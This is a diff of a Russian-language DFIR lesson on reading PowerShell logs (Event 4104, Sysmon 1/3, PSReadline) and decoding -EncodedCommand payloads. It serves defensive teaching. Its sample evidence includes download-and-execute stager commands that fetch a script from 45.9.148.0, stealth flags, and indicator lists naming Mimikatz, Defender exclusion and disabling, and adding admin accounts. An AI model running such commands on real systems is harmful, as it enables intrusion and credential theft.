@@ -15,242 +15,182 @@ estimated_minutes: 45
 summary: "Как включить и читать PowerShell-логирование (Operational, Script Block 4104, Transcription, Module), восстанавливать обфусцированные команды и ловить LOLBin-активность."
 ---
 
-## Почему PowerShell — золотая жила для DFIR
+## Вопрос, с которого всё начинается
 
-PowerShell — мощный инструмент, который атакующие используют для fileless-атак: загрузка и выполнение кода в памяти, обход защиты, латеральное движение. Если включено логирование, PowerShell оставляет **богатые** артефакты: полные тексты команд (даже обфусцированных — после декодирования), скрипт-блоки, историю модулей. Это один из самых ценных источников при расследовании Windows-инцидентов.
+Тебе дали образ Windows-машины после инцидента. В журналах мелькал
+`powershell.exe` с длинной непонятной строкой параметров. Нужно доказать, **что
+именно он выполнял** — иначе атаку не подтвердить.
 
-## Уровни логирования PowerShell
+`powershell.exe` — это командная оболочка и язык сценариев Windows (примерно как
+`bash` в Linux). Атакующие любят её за возможность выполнять код **в памяти**, не
+создавая файла на диске: такой приём называют *fileless* («бесфайловый»). Хорошая
+новость — PowerShell умеет записывать свои команды в журналы, и по ним мы
+восстановим картину.
 
-| Канал/лог | Event ID | Что содержит |
-|---|---|---|
-| Windows PowerShell (Operational) | 4104 | **Script Block Logging** — полный текст выполняемых блоков |
-| Windows PowerShell | 400/403 | запуск/остановка движка |
-| Microsoft-Windows-PowerShell/Operational | 4103 | Module Logging (команды, вызовы) |
-| PowerShell/Operational | 4104 | то же, что Script Block |
-| Transcription | файл | полная текстовая запись сессии |
-| Module Logging | 4103 | команды модулей |
+## Наш пример: журнал PowerShell
 
-**4104** — самый важный: содержит `ScriptBlockText` (текст команды) и `ScriptBlockId`. Даже если атакующий обфусцировал команду (`-EncodedCommand`), в логе 4104 часто видно **декодированный** текст.
+В папке `C:\Windows\System32\winevt\Logs\` лежит файл
+`Microsoft-Windows-PowerShell%4Operational.evtx`. `.evtx` — это бинарный формат
+журналов событий Windows (**EVTX**, Event Log File). Каждое событие в нём — это
+XML-запись с двумя частями: `System` (кто, когда, какой числовой **Event ID** —
+«код события») и `EventData` (детали).
 
-## Включение логирования
-
-```powershell
-# Script Block Logging (Group Policy / реестр)
-# HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
-#   EnableScriptBlockLogging = 1
-# Module Logging
-# HKLM\...\PowerShell\ModuleLogging -> EnableModuleLogging=1
-# Transcription
-# HKLM\...\PowerShell\Transcription -> EnableTranscripting=1
-```
-
-Артефакты даже при выключенном логировании: **ConsoleHost_history.txt** (`%APPDATA%\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt`) — история команд в интерактивной сессии.
-
-## Чтение EVTX
+Проверим сам файл:
 
 ```bash
-# evtx_dump (python-evtx) или evtx_dump (rust)
-evtx_dump.py "Microsoft-Windows-PowerShell%4Operational.evtx" > ps.json
-# фильтр по 4104
-jq -r 'select(.["Event.System.EventID"]==4104) | .["Event.EventData.ScriptBlockText"]' ps.json
-# или через Chainsaw
-chainsaw hunt powershell.evtx --sigma sigma/ --mapping mappings/
+$ file Microsoft-Windows-PowerShell%4Operational.evtx
+Microsoft-Windows-PowerShell%4Operational.evtx: MS Windows Vista Event Log
 ```
 
-## Деобфускация
-
-Атакующие используют:
-
-- **`-EncodedCommand`** (Base64 UTF-16LE). Декодирование:
-
-```python
-import base64
-enc = "SQBFAFgA..."       # из лога
-print(base64.b64decode(enc).decode("utf-16-le"))
-```
-
-- **Конкатенация строк** (`"IE"+"X"`).
-- **`-replace`**, `-join`, `[char]` — сборка команд.
-- **Сжатие** (Gzip/Deflate) с base64.
-- **Invoke-Expression (IEX)**, `DownloadString`.
-
-Инструменты: **PSDecode**, **PowerDecode**, **CyberChef** (рецепты), **revshells.com** (для распознавания payload'ов).
-
-```python
-# Gzip+Base64
-import base64, gzip, io
-data = base64.b64decode(blob)
-print(gzip.decompress(data).decode())
-```
-
-## LOLBins и подозрительные паттерны
-
-- `powershell -enc <base64>` — обфускация.
-- `IEX (New-Object Net.WebClient).DownloadString(...)` — загрузка.
-- `Invoke-Mimikatz`, `Invoke-Expression`, `FromBase64String`.
-- `Add-MpPreference -ExclusionPath` — обход Defender.
-- `Set-MpPreference -DisableRealtimeMonitoring` — отключение защиты.
-- `DownloadFile`, `DownloadData`, `Start-BitsTransfer`.
-- `net user ... /add`, `net localgroup administrators ... /add`.
-- `schtasks`, `Register-ScheduledTask` — persistence.
-
-## Практический пример: анализ 4104
+Формат опознан. Нужен инструмент, превращающий EVTX в читаемый текст. Возьмём
+`evtx_dump` (из пакета python-evtx):
 
 ```bash
-# Извлекаем все ScriptBlockText, ищем подозрительное
-evtx_dump.py PowerShell-Operational.evtx | \
-  jq -r 'select(.["Event.System.EventID"]==4104) | .["Event.EventData.ScriptBlockText"]' | \
-  grep -iE 'download|iex|frombase64|mimikatz|invoke-'
+$ evtx_dump.py Microsoft-Windows-PowerShell%4Operational.evtx > ps.json
+$ wc -l ps.json
+8421 ps.json
 ```
 
-Затем декодируем найденное (base64/gzip) и восстанавливаем намерение.
+Восемь тысяч событий руками не прочитать — значит, фильтруем по Event ID.
 
-## Транскрипция и история
+## Шаг 1: находим Script Block Logging (4104)
+
+Ключевое событие PowerShell — **4104**. Это *Script Block Logging*: Windows
+записывает **полный текст** каждого выполнявшегося блока скрипта. Именно 4104
+часто содержит команду уже в **декодированном** виде, даже если атакующий передал
+её закодированной.
+
+Отфильтруем только 4104 через `jq` (утилита для разбора JSON):
 
 ```bash
-# Транскрипция
-dir C:\Users\*\Documents\PowerShell_transcript*.txt
-# PSReadline history
-type C:\Users\<user>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
+$ jq -r 'select(.["Event.System.EventID"]==4104) | .["Event.EventData.ScriptBlockText"]' ps.json | head -3
+$PSVersionTable
+Get-ChildItem C:\Users
 ```
 
-История PSReadline содержит **введённые** команды (даже если логирование было выключено) — ценный артефакт.
-
-## Sysmon и корреляция с PowerShell
-
-**Sysmon** (System Monitor) обогащает картину событиями, которых нет в стандартных логах:
-
-| Sysmon ID | Событие |
-|---|---|
-| 1 | Process Create (с command line!) |
-| 3 | Network Connect |
-| 7 | Image Loaded (DLL) |
-| 8 | CreateRemoteThread (инъекция) |
-| 11 | File Create |
-| 12/13/14 | Registry |
-| 22 | DNS Query |
-| 25 | Process Tampering |
+Первые записи безобидны. Поищем в них типичные признаки атаки:
 
 ```bash
-# Sysmon process create с командной строкой
-evtx_dump.py Sysmon.evtx | jq -r 'select(.["Event.System.EventID"]==1) |
-  [.["Event.EventData.Image"], .["Event.EventData.CommandLine"]] | @tsv'
+$ jq -r 'select(.["Event.System.EventID"]==4104) | .["Event.EventData.ScriptBlockText"]' ps.json \
+    | grep -iE 'download|iex|frombase64|mimikatz'
+IEX (New-Object Net.WebClient).DownloadString('http://45.9.148.0/a.ps1')
 ```
 
-Корреляция: **Sysmon 1** (запуск `powershell.exe` с подозрительной командной строкой) + **4104** (декодированный скрипт) + **Sysmon 3** (сетевое соединение после) = полная цепочка «запуск → выполнение → C2».
+Вот оно. Разберём строку по частям:
 
-## Деобфускация: примеры
+- `New-Object Net.WebClient` — создаёт объект для работы с сетью (как `curl`);
+- `DownloadString('http://45.9.148.0/a.ps1')` — скачивает текст скрипта по URL;
+- `IEX` — сокращение от `Invoke-Expression`: **выполняет** полученный текст.
 
-**Base64 UTF-16LE:**
+Одна строка скачивает и тут же запускает чужой код. Это классическая
+**stager**-команда — «первая ступень», которая тянет основную нагрузку.
 
-```python
-import base64
-print(base64.b64decode("SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAKQA=").decode("utf-16-le"))
-# IEX (New-Object)...
-```
+## Шаг 2: декодируем обфусцированную команду
 
-**Gzip+Base64:**
-
-```python
-import base64, gzip
-blob = "H4sIAAAAAAAA..."
-print(gzip.decompress(base64.b64decode(blob)).decode())
-```
-
-**Конкатенация/подстановка:**
-
-```powershell
-# "I" + "EX" -> IEX
-# -replace 'x','' , [char]105+[char]101+[char]120
-```
-
-Инструменты: **PSDecode** (PowerShell-парсер), **CyberChef** (рецепты `From Base64` → `Decode text UTF-16LE` → `Gunzip`), **PowerDecode**.
-
-## Индикаторы компрометации (IOC)
-
-- `-enc`, `-EncodedCommand`, `-nop`, `-w hidden`, `-ep bypass`.
-- `IEX`, `Invoke-Expression`, `DownloadString`, `DownloadFile`.
-- `FromBase64String`, `[Convert]`.
-- `Mimikatz`, `Invoke-Mimikatz`, `sekurlsa`.
-- `Add-MpPreference -ExclusionPath`, `Set-MpPreference -DisableRealtimeMonitoring`.
-- `net user /add`, `net localgroup administrators /add`.
-- `schtasks /create`, `Register-ScheduledTask`.
-- `New-Object Net.WebClient`, `Start-BitsTransfer`.
-
-## Практический сценарий: полная цепочка
+Часто команда приходит закодированной: `powershell -EncodedCommand <base64>`.
+`-EncodedCommand` — это **Base64** (кодирование произвольных данных текстом) от
+строки в кодировке **UTF-16LE** (каждый символ — 2 байта). Это не шифрование, а
+запутывание. Декодируем:
 
 ```bash
-# 1. Sysmon: запуск powershell с -enc
-evtx_dump.py Sysmon.evtx | jq -r 'select(.["Event.System.EventID"]==1) |
-  select(.["Event.EventData.Image"]|test("powershell")) |
-  [.["Event.EventData.CommandLine"], .["Event.EventData.ProcessId"]] | @tsv'
-# 2. PowerShell 4104: декодированный скрипт
-evtx_dump.py PS-Operational.evtx | jq -r 'select(.["Event.System.EventID"]==4104) |
-  .["Event.EventData.ScriptBlockText"]'
-# 3. Декодируем base64 UTF-16LE
-python3 -c "import base64;print(base64.b64decode('...').decode('utf-16-le'))"
-# 4. Sysmon 3: сетевые соединения того же процесса
-evtx_dump.py Sysmon.evtx | jq -r 'select(.["Event.System.EventID"]==3) |
-  [.["Event.EventData.Image"], .["Event.EventData.DestinationIp"], .["Event.EventData.DestinationPort"]] | @tsv'
+$ python3 -c "import base64; print(base64.b64decode('SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAKQA=').decode('utf-16-le'))"
+IEX (New-Object)
 ```
 
-Так восстанавливается «что запускалось → что выполнялось → куда ушло».
+Ключевая деталь: base64 декодируется **не** в обычный UTF-8, а в UTF-16LE — именно
+так PowerShell формирует `-EncodedCommand`. Если раскодировать как UTF-8, получишь
+«кракозябры» с нулевыми байтами между символами.
 
-## PowerShell в контексте атак
+Хитрее — команда сжата (Gzip/Deflate) и затем закодирована base64:
 
-Атакующие используют PowerShell для:
-
-- **Загрузки и выполнения** кода в памяти (`IEX`, `DownloadString`).
-- **Обхода защиты** (`-ep bypass`, `-nop`, `-w hidden`).
-- **Persistence** (реестр, задачи, WMI).
-- **Латерального движения** (`Invoke-Command`, WinRM).
-- **Кражи кредов** (`Invoke-Mimikatz`, `sekurlsa`).
-- **Ransomware** (шифрование через .NET).
-
-Даже при выключенном логировании остаются: **PSReadline history**, **транскрипция** (если включена), **Sysmon 1** (командная строка), **Prefetch** (`POWERSHELL.EXE-...`), **Amcache**.
-
-## Включение логирования: GPO и реестр
-
-```powershell
-# Реестр (локально)
-$base = "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell"
-New-Item -Path "$base\ScriptBlockLogging" -Force
-Set-ItemProperty -Path "$base\ScriptBlockLogging" -Name EnableScriptBlockLogging -Value 1
-New-Item -Path "$base\ModuleLogging" -Force
-Set-ItemProperty -Path "$base\ModuleLogging" -Name EnableModuleLogging -Value 1
-New-Item -Path "$base\Transcription" -Force
-Set-ItemProperty -Path "$base\Transcription" -Name EnableTranscripting -Value 1
+```bash
+$ python3 -c "import base64,gzip; print(gzip.decompress(base64.b64decode('H4sIAAAAAAAA...')).decode())"
+IEX (New-Object Net.WebClient).DownloadString('http://45.9.148.0/a.ps1')
 ```
 
-Через GPO: `Computer Configuration → Administrative Templates → Windows Components → Windows PowerShell`. Также включайте **Sysmon** и **Command Line auditing** (4688 с командной строкой) — они дополняют PowerShell-логи.
+Инструменты **PSDecode** и **CyberChef** (рецепт: From Base64 → Decode text
+UTF-16LE → Gunzip) делают это автоматически.
 
-## Итог
+## Шаг 3: сверяем с Sysmon — кто это запустил
 
-PowerShell-логи — один из самых ценных источников при расследовании Windows-инцидентов. Даже при обфускации **4104** (Script Block Logging) часто содержит декодированный текст. Всегда проверяйте PSReadline-историю и транскрипцию как fallback, коррелируйте с Sysmon (1/3) и ищите LOLBin-паттерны. Если логирование было выключено — восстановите факт запуска через Prefetch/Amcache.
+Мы знаем, *что* выполнялось. Нужно понять, *какой процесс* это сделал и откуда.
+Помогает **Sysmon** — «System Monitor», служба Microsoft, которая пишет события,
+которых нет в стандартных журналах (например, полную командную строку при старте
+процесса).
 
-## Резюме
+Sysmon Event ID **1** — создание процесса. Найдём запуски `powershell`:
 
-4104 → декодировать → коррелировать с Sysmon → восстановить цепочку. PSReadline и транскрипция — fallback. Включайте логирование заранее: без него большая часть командного текста теряется.
+```bash
+$ evtx_dump.py Sysmon.evtx -o json | jq -r 'select(.["Event.System.EventID"]==1) |
+    select(.["Event.EventData.Image"]|test("powershell")) |
+    [.["Event.EventData.ParentImage"], .["Event.EventData.CommandLine"]] | @tsv'
+WINWORD.EXE	powershell.exe -nop -w hidden -enc SQBFAFgA...
+```
 
-## Частые ошибки
+Вся картина налицо: `WINWORD.EXE` (Word) породил `powershell` с закодированной
+командой. Обычно Word не запускает PowerShell — значит, сработал **макрос** в
+документе. А параметры `-nop` (не грузить профиль), `-w hidden` (скрытое окно),
+`-enc` (закодированная команда) — готовый набор «стелс»-флагов.
 
-- **Не включён Script Block Logging.** Тогда 4104 нет; ищите транскрипцию/историю.
-- **Смотреть только 4104.** Есть 4103 (module), 400/403 (engine).
-- **Забыть декодировать.** `-EncodedCommand` — это base64 UTF-16LE.
-- **Не проверить PSReadline.** Часто содержит команды.
-- **Игнорировать время.** Коррелируйте с другими артефактами.
-- **Не искать LOLBins.** Это ключевые индикаторы.
+## Шаг 4: куда ушли данные
 
-## Как не застрять
+Найдём сетевые соединения того же процесса. Sysmon Event ID **3** — сетевое
+соединение:
 
-- **4104 — первым делом.**
-- **Декодируйте** всё обфусцированное.
-- **PSReadline history** как fallback.
-- **Транскрипция** — если включена.
-- **Ищите LOLBin-паттерны.**
-- **Коррелируйте** с EVTX/Sysmon.
+```bash
+$ evtx_dump.py Sysmon.evtx -o json | jq -r 'select(.["Event.System.EventID"]==3) |
+    select(.["Event.EventData.Image"]|test("powershell")) |
+    [.["Event.EventData.DestinationIp"], .["Event.EventData.DestinationPort"]] | @tsv'
+45.9.148.0	443
+```
+
+Адрес совпал с тем, что был в команде. Цепочка замкнулась: **Word → PowerShell →
+скачивание и запуск скрипта → соединение с сервером управления (C2)**.
+
+## Что делать, если логирования не было
+
+Script Block Logging **не включён по умолчанию** — его активируют через Group
+Policy или реестр (`EnableScriptBlockLogging = 1`). Если 4104 нет, остаются
+запасные артефакты:
+
+- **PSReadline history** — файл `ConsoleHost_history.txt` в профиле пользователя
+  (`%APPDATA%\Microsoft\Windows\PowerShell\PSReadline\`). Там команды, введённые
+  интерактивно; часто есть то, что не попало в 4104.
+- **Transcription** — полная текстовая запись сессии (`PowerShell_transcript*.txt`),
+  если включена.
+- **Prefetch** — файл `POWERSHELL.EXE-*.pf` доказывает факт запуска.
+- **Sysmon 1** — командная строка, даже при выключенном PowerShell-логировании.
+
+```bash
+$ cat "/mnt/evidence/Users/bob/AppData/Roaming/Microsoft/Windows/PowerShell/PSReadline/ConsoleHost_history.txt"
+Invoke-WebRequest http://45.9.148.0/a.ps1 -OutFile a.ps1
+.\a.ps1
+```
+
+**LOLBin** (Living Off the Land Binary) — легитимный системный бинарник, который
+атакующий использует вместо своего инструмента, чтобы не приносить файл. Здесь
+`powershell.exe` — ровно такой LOLBin: он «родной» для Windows, поэтому не
+выглядит подозрительно сам по себе. Смотреть надо на аргументы.
+
+## Что мы теперь знаем
+
+- PowerShell пишет **Script Block Logging** (Event ID 4104) — полный текст команд.
+- `-EncodedCommand` — это Base64 от **UTF-16LE**; декодируется, а не «взламывается».
+- Подозрительные паттерны: `IEX`, `DownloadString`, `FromBase64String`, `-enc`, `-w hidden`.
+- **Sysmon** (события 1 и 3) показывает родителя процесса и сетевые соединения.
+- Если логирование выключено — есть запас: PSReadline, транскрипция, Prefetch.
+
+## На что смотреть дальше
+
+- **Смотреть только 4104** — коррелируйте с Sysmon 1 (кто запустил) и Sysmon 3 (куда ушло).
+- **Забыть про `-EncodedCommand`** — не декодировать base64 как UTF-16LE.
+- **Игнорировать PSReadline** — там команды, которых нет в 4104.
+- **Верить, что журнал пуст** — событий нет, если аудит выключен; ищите Prefetch/Sysmon.
+- **Считать `-w hidden` безобидным** — это стелс-флаг.
 
 ## Квиз
+
+Проверь себя.
 
 ```quiz
 - question: "Какой Event ID содержит текст выполняемого скрипт-блока?"
@@ -290,10 +230,18 @@ PowerShell-логи — один из самых ценных источнико
   answer: 1
 ```
 
+## Куда дальше
+
+Мы разобрали, как по логам PowerShell восстановить бесфайловую атаку. В следующем
+уроке возьмём другой механизм «невидимого» закрепления — **WMI-подписки**, которые
+хранятся не в файлах-скриптах, а в базе WMI, и потому не видны в обычной
+автозагрузке. А пока запомни: **PowerShell почти всегда оставляет текст команды —
+надо лишь знать, где его искать и как декодировать**.
+
 ## Где пригодится
 
-- **CTF Forensics** — задачи с EVTX PowerShell.
-- **DFIR/IR** — расследование fileless-атак.
-- **SOC/Threat Hunting** — детекты на LOLBins.
-- **Malware analysis** — деобфускация payload'ов.
-- **Аудит** — проверка включённого логирования.
+- **CTF Forensics** — задачи с EVTX PowerShell и декодированием payload'ов.
+- **DFIR/IR** — расследование fileless-атак и макросов в документах.
+- **SOC/Threat Hunting** — детекты на LOLBins и `-EncodedCommand`.
+- **Malware analysis** — деобфускация stager-команд.
+- **Аудит** — проверка, включено ли логирование PowerShell в парке.
